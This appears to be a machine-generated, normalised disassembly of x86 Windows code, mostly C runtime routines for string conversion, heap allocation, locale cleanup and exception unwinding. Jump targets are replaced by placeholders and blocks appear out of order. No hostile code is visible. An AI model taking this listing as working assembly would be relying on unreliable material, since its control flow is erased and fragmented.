mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_404072
leave
retn
push edi
call sub_408801
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_408801
mov esi eax
push edi
sar esi 0x5
call sub_408801
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_408801
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_408801
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_408801
mov esi eax
push edi
sar esi 0x5
call sub_408801
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_408801
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_40b87d
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_408801
mov esi eax
push edi
sar esi 0x5
call sub_408801
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_405acc
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_40a248
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40a067
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4058af
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_40a353
push ebp
mov ebp esp
push ecx
mov ax [ ebp + 0x8 ]
mov ecx 0xffff
cmp ax cx
jne r-xdata
mov ecx 0x100
cmp ax cx
jae r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
neg eax
sbb eax eax
and eax [ ebp - 0x4 ]
movzx eax ax
movzx ecx ax
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
jmp r-xdata
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
sub_40a3a5
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
push 0x30
pop ecx
cmp ax cx
jb r-xdata
or eax 0xffffffff
pop ebp
retn
cmp ax 0x3a
jae r-xdata
mov edx 0xff10
cmp ax dx
jae r-xdata
movzx eax ax
sub eax ecx
pop ebp
retn
mov ecx 0xff1a
mov edx 0x660
cmp ax dx
jb r-xdata
movzx eax ax
sub eax edx
pop ebp
retn
lea ecx [ edx + 0xa ]
cmp ax cx
jae r-xdata
mov edx 0x6f0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x966
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xc66
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0xe50
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
lea edx [ ecx + 0x76 ]
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x50
cmp ax dx
jb r-xdata
add ecx 0x50
cmp ax cx
jb r-xdata
mov edx 0x1040
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
mov edx 0x17e0
cmp ax dx
jb r-xdata
lea ecx [ edx + 0xa ]
cmp ax cx
jb r-xdata
add edx 0x30
cmp ax dx
jb r-xdata
add ecx 0x30
jmp r-xdata
cmp ax cx
jb r-xdata
sub_40a550
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40a584
push 0x8
push r--data
call sub_405550
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_405595
retn
push 0xc
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_407502
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a5cd
sub_40a69e
call sub_407f04
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_407f2d
pop ecx
push 0x3
call sub_4049c8
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_405936
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_40a6e1
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_4040b9
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_404081
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_405903
pop ecx
call sub_4058af
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_4058af
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058c2
pop ecx
mov [ esi ] eax
push esi
call sub_405903
pop ecx
test eax eax
je r-xdata
call sub_4058af
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_4058c2
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_40a78c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_4058af
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_405903
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_40a806
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x4c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
push eax
call sub_404081
pop ecx
sub_40a902
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_404081
pop ecx
push eax
call sub_404081
pop ecx
sub_40a969
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_404081
push [ esi + 0x8 ]
call sub_404081
push [ esi + 0xc ]
call sub_404081
push [ esi + 0x10 ]
call sub_404081
push [ esi + 0x14 ]
call sub_404081
push [ esi + 0x18 ]
call sub_404081
push [ esi ]
call sub_404081
push [ esi + 0x20 ]
call sub_404081
push [ esi + 0x24 ]
call sub_404081
push [ esi + 0x28 ]
call sub_404081
push [ esi + 0x2c ]
call sub_404081
push [ esi + 0x30 ]
call sub_404081
push [ esi + 0x34 ]
call sub_404081
push [ esi + 0x1c ]
call sub_404081
push [ esi + 0x38 ]
call sub_404081
push [ esi + 0x3c ]
call sub_404081
add esp 0x40
push [ esi + 0x40 ]
call sub_404081
push [ esi + 0x44 ]
call sub_404081
push [ esi + 0x48 ]
call sub_404081
push [ esi + 0x4c ]
call sub_404081
push [ esi + 0x50 ]
call sub_404081
push [ esi + 0x54 ]
call sub_404081
push [ esi + 0x58 ]
call sub_404081
push [ esi + 0x5c ]
call sub_404081
push [ esi + 0x60 ]
call sub_404081
push [ esi + 0x64 ]
call sub_404081
push [ esi + 0x68 ]
call sub_404081
push [ esi + 0x6c ]
call sub_404081
push [ esi + 0x70 ]
call sub_404081
push [ esi + 0x74 ]
call sub_404081
push [ esi + 0x78 ]
call sub_404081
push [ esi + 0x7c ]
call sub_404081
add esp 0x40
push [ esi + 0x80 ]
call sub_404081
push [ esi + 0x84 ]
call sub_404081
push [ esi + 0x88 ]
call sub_404081
push [ esi + 0x8c ]
call sub_404081
push [ esi + 0x90 ]
call sub_404081
push [ esi + 0x94 ]
call sub_404081
push [ esi + 0x98 ]
call sub_404081
push [ esi + 0x9c ]
call sub_404081
push [ esi + 0xa0 ]
call sub_404081
push [ esi + 0xa4 ]
call sub_404081
push [ esi + 0xa8 ]
call sub_404081
push [ esi + 0xb8 ]
call sub_404081
push [ esi + 0xbc ]
call sub_404081
push [ esi + 0xc0 ]
call sub_404081
push [ esi + 0xc4 ]
call sub_404081
push [ esi + 0xc8 ]
call sub_404081
add esp 0x40
push [ esi + 0xcc ]
call sub_404081
push [ esi + 0xb4 ]
call sub_404081
push [ esi + 0xd4 ]
call sub_404081
push [ esi + 0xd8 ]
call sub_404081
push [ esi + 0xdc ]
call sub_404081
push [ esi + 0xe0 ]
call sub_404081
push [ esi + 0xe4 ]
call sub_404081
push [ esi + 0xe8 ]
call sub_404081
push [ esi + 0xd0 ]
call sub_404081
push [ esi + 0xec ]
call sub_404081
push [ esi + 0xf0 ]
call sub_404081
push [ esi + 0xf4 ]
call sub_404081
push [ esi + 0xf8 ]
call sub_404081
push [ esi + 0xfc ]
call sub_404081
push [ esi + 0x100 ]
call sub_404081
push [ esi + 0x104 ]
call sub_404081
add esp 0x40
push [ esi + 0x108 ]
call sub_404081
push [ esi + 0x10c ]
call sub_404081
push [ esi + 0x110 ]
call sub_404081
push [ esi + 0x114 ]
call sub_404081
push [ esi + 0x118 ]
call sub_404081
push [ esi + 0x11c ]
call sub_404081
push [ esi + 0x120 ]
call sub_404081
push [ esi + 0x124 ]
call sub_404081
push [ esi + 0x128 ]
call sub_404081
push [ esi + 0x12c ]
call sub_404081
push [ esi + 0x130 ]
call sub_404081
push [ esi + 0x134 ]
call sub_404081
push [ esi + 0x138 ]
call sub_404081
push [ esi + 0x13c ]
call sub_404081
push [ esi + 0x140 ]
call sub_404081
push [ esi + 0x144 ]
call sub_404081
add esp 0x40
push [ esi + 0x148 ]
call sub_404081
push [ esi + 0x14c ]
call sub_404081
push [ esi + 0x150 ]
call sub_404081
push [ esi + 0x154 ]
call sub_404081
push [ esi + 0x158 ]
call sub_404081
push [ esi + 0x15c ]
call sub_404081
push [ esi + 0x160 ]
call sub_404081
add esp 0x1c
sub_40ace9
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
leave
retn
push ecx
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea ecx [ ecx * 2 + 0x8 ]
cmp ecx 0x400
ja r-xdata
push ebx
call sub_40af16
pop ecx
mov eax edi
mov esi [ ebp - 0x8 ]
push 0x0
push 0x0
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40b111
mov edi eax
add esp 0x18
test edi edi
je r-xdata
push ecx
call sub_4040b9
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax ecx
call sub_40ba00
mov ebx esp
test ebx ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
jmp r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test edi edi
jle r-xdata
mov ecx [ ebp + 0x20 ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp edi ecx
jg r-xdata
push edi
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40b111
add esp 0x18
test eax eax
je r-xdata
lea eax [ edi * 2 + 0x8 ]
cmp eax ecx
ja r-xdata
push ecx
push [ ebp + 0x1c ]
push esi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40b111
add esp 0x18
jmp r-xdata
push esi
call sub_40af16
pop ecx
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
push eax
call sub_4040b9
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_40ba00
mov esi esp
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push eax
jmp r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
push edi
push esi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov edi eax
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_40aed2
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40ace9
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40af16
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_404081
pop ecx
sub_40af35
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x1c ]
push ebx
push esi
push edi
xor edi edi
test ecx ecx
jne r-xdata
xor eax eax
cmp [ ebp + 0x20 ] eax
push edi
push edi
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov ecx eax
jle r-xdata
xor eax eax
jmp r-xdata
mov esi edi
cmp ebx 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_404072
leave
retn
lea eax [ ebx + ebx ]
push eax
push edi
push esi
call sub_406ba0
add esp 0xc
push ebx
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push esi
call sub_40af16
pop ecx
mov eax edi
push [ ebp + 0x18 ]
push eax
push esi
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov edi eax
push eax
call sub_4040b9
mov esi eax
pop ecx
test esi esi
je r-xdata
call sub_40ba00
mov esi esp
test esi esi
je r-xdata
mov [ esi ] 0xdddd
mov [ esi ] 0xcccc
jmp r-xdata
test esi esi
je r-xdata
add esi 0x8
jmp r-xdata
sub_40b021
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405d89
push [ ebp + 0x20 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40af35
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40b05f
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_4058af
mov [ eax ] 0x16
call sub_405a91
or eax 0xffffffff
pop ebp
retn
sub_40b099
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_40b15d
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40b0e7
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_40b099
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_40b111
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b0e7
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_40b15d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_40b1cb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40b211
pop ecx
test eax eax
je r-xdata
push esi
call sub_40b27e
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_408801
push eax
call sub_40ba2c
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40b211
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_408801
pop ecx
push eax
call sub_408879
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40b27e
push 0x14
push r--data
call sub_405550
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_406fa9
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b359
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_405595
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4086a1
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40b326
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_40b1cb
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_40b1cb
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40b370
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b390
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_404072
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40b3d5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40b3d5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40b390
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40b485
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40b4a4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
